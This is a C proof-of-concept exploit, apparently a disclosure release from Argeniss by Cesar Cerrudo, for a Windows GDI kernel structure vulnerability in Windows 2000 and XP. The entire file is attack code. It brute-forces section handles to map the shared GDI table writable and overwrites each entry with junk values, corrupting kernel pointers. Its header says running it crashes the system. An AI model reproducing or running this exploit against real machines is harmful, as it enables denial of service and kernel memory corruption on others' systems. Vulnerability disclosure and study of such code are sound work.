//  Argeniss  - Information Security - www.argeniss.com
//  
//  by: Cesar Cerrudo
//
//  Windows GDI Kernel structure vulnerability
//
//  Versions affected: Win2k sp0,sp1,sp2,sp3,sp4, WinXP sp0,sp1,sp2
//    	
// 
//  Note: if it doesn't work it's because the wrong section is mapped 
try changing hMapFile initial value
//         runnin this PoC will cause BSOD
//


#include "windows.h"
#include "stdio.h"

#pragma comment(lib, "user32")

typedef struct
{
   DWORD pKernelInfo;
   WORD  ProcessID; 
   WORD  _nCount;
   WORD  nUpper;
   WORD  nType;
   DWORD pUserInfo;
} GDITableEntry;

typedef struct _SECTION_BASIC_INFORMATION {
  ULONG                   d000;
  ULONG                   SectionAttributes;
  LARGE_INTEGER           SectionSize;
} SECTION_BASIC_INFORMATION;

typedef DWORD (CALLBACK* NTQUERYSECTION)(HANDLE, DWORD, 
PVOID,DWORD,DWORD*);
NTQUERYSECTION NtQuerySection;

int main(int argc, char* argv[])
{
	SECTION_BASIC_INFORMATION buff;
	HANDLE hMapFile; 
    	hMapFile=(HANDLE)0x10; 
	LPVOID lpMapAddress=NULL;
	HWND hWin;

	
hWin=CreateWindow(NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL);

	while(!lpMapAddress){
		hMapFile=(void*)((int)hMapFile+1);
		lpMapAddress = MapViewOfFile(hMapFile, 
FILE_MAP_ALL_ACCESS, 0, 0, 0);
	}

	if (lpMapAddress == NULL) { 
		printf("Could not map section."); 
		return 0;
	}


	HMODULE hL;
	hL=LoadLibrary("Ntdll.dll");
	NtQuerySection= (DWORD (WINAPI *)(HANDLE, DWORD, 
PVOID,DWORD,DWORD*))GetProcAddress(hL,"NtQuerySection");

	if (NtQuerySection(hMapFile,0,&buff,sizeof(buff),0)){
		printf("Could not get section size"); 
		return 0;
	}

char * sMap;
DWORD i;
sMap=(char*)lpMapAddress;
printf("Section size: 0x%x\n",buff.SectionSize.QuadPart);
printf("Writing to section.\nPress Ctr+C to quit\n"); 


GDITableEntry *gdiTable;


	gdiTable=(GDITableEntry *)lpMapAddress;
	
	for (i=0;i<buff.SectionSize.QuadPart ;i+=sizeof(GDITableEntry)){

		gdiTable->_nCount =0x5858;
		gdiTable->nType  =0x5858;
		gdiTable->nUpper =0x5858;
		gdiTable->ProcessID =0x5858;
		gdiTable->pKernelInfo   =0x58585858;
		gdiTable->pUserInfo   =0x58585858;
			
		gdiTable++;
	}




CloseHandle(hMapFile);

	return 0;
}
